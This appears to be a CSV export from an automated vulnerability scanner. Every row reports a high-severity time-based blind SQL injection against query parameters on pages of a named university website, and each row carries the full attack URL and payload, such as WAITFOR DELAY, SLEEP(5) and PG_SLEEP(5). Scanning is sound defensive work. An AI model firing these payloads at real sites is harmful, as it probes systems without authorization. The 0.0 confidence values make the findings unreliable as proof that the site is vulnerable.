Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-chemistry/?search=1%27+WAITFOR+DELAY+%270%3A0%3A5%27--#1574017975212-eafa706d-27bf),1' WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-chemistry/?query=1%27+WAITFOR+DELAY+%270%3A0%3A5%27--#1574017975212-eafa706d-27bf),1' WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-chemistry/?page=1%27+WAITFOR+DELAY+%270%3A0%3A5%27--#1574017975212-eafa706d-27bf),1' WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-chemistry/?cmd=1%27+WAITFOR+DELAY+%270%3A0%3A5%27--#1574017975212-eafa706d-27bf),1' WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-chemistry/?file=1%27+WAITFOR+DELAY+%270%3A0%3A5%27--#1574017975212-eafa706d-27bf),1' WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-chemistry/?id=%27%3BWAITFOR+DELAY+%270%3A0%3A5%27--#1574017975212-eafa706d-27bf),';WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-chemistry/?q=%27%3BWAITFOR+DELAY+%270%3A0%3A5%27--#1574017975212-eafa706d-27bf),';WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-chemistry/?search=%27%3BWAITFOR+DELAY+%270%3A0%3A5%27--#1574017975212-eafa706d-27bf),';WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-chemistry/?query=%27%3BWAITFOR+DELAY+%270%3A0%3A5%27--#1574017975212-eafa706d-27bf),';WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-chemistry/?page=%27%3BWAITFOR+DELAY+%270%3A0%3A5%27--#1574017975212-eafa706d-27bf),';WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-chemistry/?cmd=%27%3BWAITFOR+DELAY+%270%3A0%3A5%27--#1574017975212-eafa706d-27bf),';WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-chemistry/?file=%27%3BWAITFOR+DELAY+%270%3A0%3A5%27--#1574017975212-eafa706d-27bf),';WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-chemistry/?file=%27%3BWAITFOR+DELAY+%270%3A0%3A5%27--#1574016447632-86c3ad7e-821a),';WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-chemistry/?page=1%27+AND+PG_SLEEP%285%29--#1574016447632-86c3ad7e-821a),1' AND PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-chemistry/?search=1%27+AND+PG_SLEEP%285%29--#1574016447632-86c3ad7e-821a),1' AND PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-chemistry/?q=1%27+WAITFOR+DELAY+%270%3A0%3A5%27--#1574016447632-86c3ad7e-821a),1' WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-chemistry/?cmd=1%27+WAITFOR+DELAY+%270%3A0%3A5%27--#1574016447632-86c3ad7e-821a),1' WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-chemistry/?file=1%22+AND+SLEEP%285%29--#1574016447632-86c3ad7e-821a),"1"" AND SLEEP(5)--",Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-chemistry/?page=1+OR+SLEEP%285%29#1574016447632-86c3ad7e-821a),1 OR SLEEP(5),Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-chemistry/?id=1%22+AND+SLEEP%285%29--#1574016447632-86c3ad7e-821a),"1"" AND SLEEP(5)--",Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-chemistry/?q=SLEEP%285%29%23#1574016447632-86c3ad7e-821a),SLEEP(5)#,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-chemistry/?search=1%22+AND+SLEEP%285%29--#1574016447632-86c3ad7e-821a),"1"" AND SLEEP(5)--",Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-chemistry/?file=1%27%3B+SELECT+PG_SLEEP%285%29--#1574016447632-86c3ad7e-821a),1'; SELECT PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-chemistry/?search=SLEEP%285%29%23#1574016447632-86c3ad7e-821a),SLEEP(5)#,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-chemistry/?file=1+OR+SLEEP%285%29#1574016447632-86c3ad7e-821a),1 OR SLEEP(5),Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-chemistry/?query=1+OR+SLEEP%285%29#1574016447632-86c3ad7e-821a),1 OR SLEEP(5),Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-chemistry/?page=1%27+WAITFOR+DELAY+%270%3A0%3A5%27--#1574016447632-86c3ad7e-821a),1' WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-chemistry/?page=1%22+AND+SLEEP%285%29--#1574016447632-86c3ad7e-821a),"1"" AND SLEEP(5)--",Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-chemistry/?q=1%27+AND+PG_SLEEP%285%29--#1574016447632-86c3ad7e-821a),1' AND PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-chemistry/?file=SLEEP%285%29%23#1574016447632-86c3ad7e-821a),SLEEP(5)#,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-chemistry/?cmd=1%22+AND+SLEEP%285%29--#1574016447632-86c3ad7e-821a),"1"" AND SLEEP(5)--",Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-chemistry/?id=1+OR+SLEEP%285%29#1574016447632-86c3ad7e-821a),1 OR SLEEP(5),Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-chemistry/?cmd=SLEEP%285%29%23#1574016447632-86c3ad7e-821a),SLEEP(5)#,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-chemistry/?page=%27%3BWAITFOR+DELAY+%270%3A0%3A5%27--#1574016447632-86c3ad7e-821a),';WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-chemistry/?cmd=%27%3BWAITFOR+DELAY+%270%3A0%3A5%27--#1574016447632-86c3ad7e-821a),';WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-chemistry/?file=1%27+WAITFOR+DELAY+%270%3A0%3A5%27--#1574016447632-86c3ad7e-821a),1' WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-chemistry/?query=1%27+AND+PG_SLEEP%285%29--#1574016447632-86c3ad7e-821a),1' AND PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-chemistry/?q=1%22+AND+SLEEP%285%29--#1574016447632-86c3ad7e-821a),"1"" AND SLEEP(5)--",Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-chemistry/?q=1+OR+SLEEP%285%29#1574016447632-86c3ad7e-821a),1 OR SLEEP(5),Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-chemistry/?search=1+OR+SLEEP%285%29#1574016447632-86c3ad7e-821a),1 OR SLEEP(5),Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-chemistry/?query=1%27+WAITFOR+DELAY+%270%3A0%3A5%27--#1574016447632-86c3ad7e-821a),1' WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-chemistry/?id=1%27+AND+PG_SLEEP%285%29--#1574016447632-86c3ad7e-821a),1' AND PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-chemistry/?query=%27%3BWAITFOR+DELAY+%270%3A0%3A5%27--#1574016447632-86c3ad7e-821a),';WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-chemistry/?query=1%22+AND+SLEEP%285%29--#1574016447632-86c3ad7e-821a),"1"" AND SLEEP(5)--",Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-chemistry/?cmd=1%27%3B+SELECT+PG_SLEEP%285%29--#1574016447632-86c3ad7e-821a),1'; SELECT PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-chemistry/?id=%27%3BWAITFOR+DELAY+%270%3A0%3A5%27--#1574016447632-86c3ad7e-821a),';WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-chemistry/?search=%27%3BWAITFOR+DELAY+%270%3A0%3A5%27--#1574016447632-86c3ad7e-821a),';WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-chemistry/?file=1%27+AND+PG_SLEEP%285%29--#1574016447632-86c3ad7e-821a),1' AND PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-chemistry/?search=1%27+WAITFOR+DELAY+%270%3A0%3A5%27--#1574016447632-86c3ad7e-821a),1' WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-chemistry/?cmd=1+OR+SLEEP%285%29#1574016447632-86c3ad7e-821a),1 OR SLEEP(5),Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-chemistry/?query=SLEEP%285%29%23#1574016447632-86c3ad7e-821a),SLEEP(5)#,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-chemistry/?page=SLEEP%285%29%23#1574016447632-86c3ad7e-821a),SLEEP(5)#,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-chemistry/?q=%27%3BWAITFOR+DELAY+%270%3A0%3A5%27--#1574016447632-86c3ad7e-821a),';WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-chemistry/?id=SLEEP%285%29%23#1574016447632-86c3ad7e-821a),SLEEP(5)#,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-chemistry/?cmd=1%27+AND+PG_SLEEP%285%29--#1574016447632-86c3ad7e-821a),1' AND PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-chemistry/?query=1%27%3B+WAITFOR+DELAY+%270%3A0%3A5%27--#1574016447632-86c3ad7e-821a),1'; WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-chemistry/?query=1%27%3B+SELECT+PG_SLEEP%285%29--#1574016447632-86c3ad7e-821a),1'; SELECT PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-chemistry/?id=1%27%3B+WAITFOR+DELAY+%270%3A0%3A5%27--#1574016447632-86c3ad7e-821a),1'; WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-chemistry/?q=1%27+AND+SLEEP%285%29--#1574016447632-86c3ad7e-821a),1' AND SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-chemistry/?page=1%27+AND+SLEEP%285%29--#1574016447632-86c3ad7e-821a),1' AND SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-chemistry/?id=%27+AND+%28SELECT+%2A+FROM+%28SELECT%28SLEEP%285%29%29%29a%29--#1574016447632-86c3ad7e-821a),' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-chemistry/?cmd=1%27+AND+SLEEP%285%29--#1574016447632-86c3ad7e-821a),1' AND SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-chemistry/?query=1%27+AND+SLEEP%285%29--#1574016447632-86c3ad7e-821a),1' AND SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-chemistry/?search=%27+AND+%28SELECT+%2A+FROM+%28SELECT%28SLEEP%285%29%29%29a%29--#1574016447632-86c3ad7e-821a),' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-chemistry/?q=1%27%3B+WAITFOR+DELAY+%270%3A0%3A5%27--#1574016447632-86c3ad7e-821a),1'; WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-chemistry/?id=1%27+WAITFOR+DELAY+%270%3A0%3A5%27--#1574016447632-86c3ad7e-821a),1' WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-chemistry/?q=1%27%3B+SELECT+PG_SLEEP%285%29--#1574016447632-86c3ad7e-821a),1'; SELECT PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-chemistry/?page=1%27%3B+WAITFOR+DELAY+%270%3A0%3A5%27--#1574016447632-86c3ad7e-821a),1'; WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-chemistry/?search=1%27%3B+SELECT+PG_SLEEP%285%29--#1574016447632-86c3ad7e-821a),1'; SELECT PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-chemistry/?file=%27+AND+%28SELECT+%2A+FROM+%28SELECT%28SLEEP%285%29%29%29a%29--#1574016447632-86c3ad7e-821a),' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-chemistry/?page=%27+AND+%28SELECT+%2A+FROM+%28SELECT%28SLEEP%285%29%29%29a%29--#1574016447632-86c3ad7e-821a),' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-chemistry/?cmd=1%27%3B+WAITFOR+DELAY+%270%3A0%3A5%27--#1574016447632-86c3ad7e-821a),1'; WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-chemistry/?page=1%27%3B+SELECT+PG_SLEEP%285%29--#1574016447632-86c3ad7e-821a),1'; SELECT PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-chemistry/?q=%27+AND+%28SELECT+%2A+FROM+%28SELECT%28SLEEP%285%29%29%29a%29--#1574016447632-86c3ad7e-821a),' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-chemistry/?id=1%27+AND+SLEEP%285%29--#1574016447632-86c3ad7e-821a),1' AND SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-chemistry/?search=1%27+AND+SLEEP%285%29--#1574016447632-86c3ad7e-821a),1' AND SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-chemistry/?file=1%27%3B+WAITFOR+DELAY+%270%3A0%3A5%27--#1574016447632-86c3ad7e-821a),1'; WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-chemistry/?query=%27+AND+%28SELECT+%2A+FROM+%28SELECT%28SLEEP%285%29%29%29a%29--#1574016447632-86c3ad7e-821a),' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-chemistry/?id=1%27%3B+SELECT+PG_SLEEP%285%29--#1574016447632-86c3ad7e-821a),1'; SELECT PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-chemistry/?file=1%27+AND+SLEEP%285%29--#1574016447632-86c3ad7e-821a),1' AND SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-chemistry/?search=1%27%3B+WAITFOR+DELAY+%270%3A0%3A5%27--#1574016447632-86c3ad7e-821a),1'; WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-chemistry/?cmd=%27+AND+%28SELECT+%2A+FROM+%28SELECT%28SLEEP%285%29%29%29a%29--#1574016447632-86c3ad7e-821a),' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/academics/engineering/electronics-communication-engineering/?q=1%27%3B+SELECT+PG_SLEEP%285%29--#1574016446128-383c784a-e794),1'; SELECT PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/academics/engineering/electronics-communication-engineering/?search=1%27%3B+SELECT+PG_SLEEP%285%29--#1574016446128-383c784a-e794),1'; SELECT PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/academics/engineering/electronics-communication-engineering/?q=1%22+AND+SLEEP%285%29--#1574016446128-383c784a-e794),"1"" AND SLEEP(5)--",Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
